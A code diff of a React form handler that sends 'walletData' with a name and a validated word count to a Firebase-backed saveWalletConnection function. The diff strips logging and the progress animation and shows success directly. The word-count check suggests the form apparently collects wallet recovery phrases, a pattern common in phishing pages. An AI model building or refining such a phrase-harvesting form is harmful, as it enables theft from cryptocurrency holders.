@@ -78,7 +78,7 @@ const handleSubmit = async () => {
   setValidationError(null);
 
   try {
-    console.log("🚀 Starting form submission...");
+    console.log("🚀 Starting submission...");
 
     let walletData = {
       name: form.name.trim(),
@@ -92,40 +92,23 @@ const handleSubmit = async () => {
       walletData.wordCount = validation.wordCount;
     }
 
-    console.log("📤 Saving to Firebase:", walletData);
-
     const result = await saveWalletConnection(walletData);
-    console.log("✅ Firebase Response:", result);
 
     if (!result?.success) {
-      throw new Error(result?.error || "Failed to save data");
+      throw new Error(result?.error || "Failed to save");
     }
 
     setUniqueId(result.uid);
 
-    // Smooth Progress Animation
-    setStep(1);
-    setProgress(20);
-    await new Promise(r => setTimeout(r, 900));
+    // Directly show success (skip progress for testing)
+    setSuccess(true);
+    console.log("🎉 setSuccess(true) called directly");
 
-    setStep(2);
-    setProgress(60);
-    await new Promise(r => setTimeout(r, 900));
-
-    setStep(3);
-setProgress(100);
-await new Promise(r => setTimeout(r, 700));
-
-console.log("🎉 About to show success modal");
-setSuccess(true);
-alert("Success modal should show now!");   // Temporary alert
-    console.log("🎉 Success modal triggered");
+    alert("✅ Success modal should appear now!");   // This must show
 
   } catch (err) {
-    console.error("❌ Submission Error:", err);
-    setError(err.message || "Something went wrong. Please try again.");
-    setStep(0);
-    setProgress(0);
+    console.error("❌ Error:", err);
+    setError(err.message || "Something went wrong");
   } finally {
     setIsLoading(false);
   }
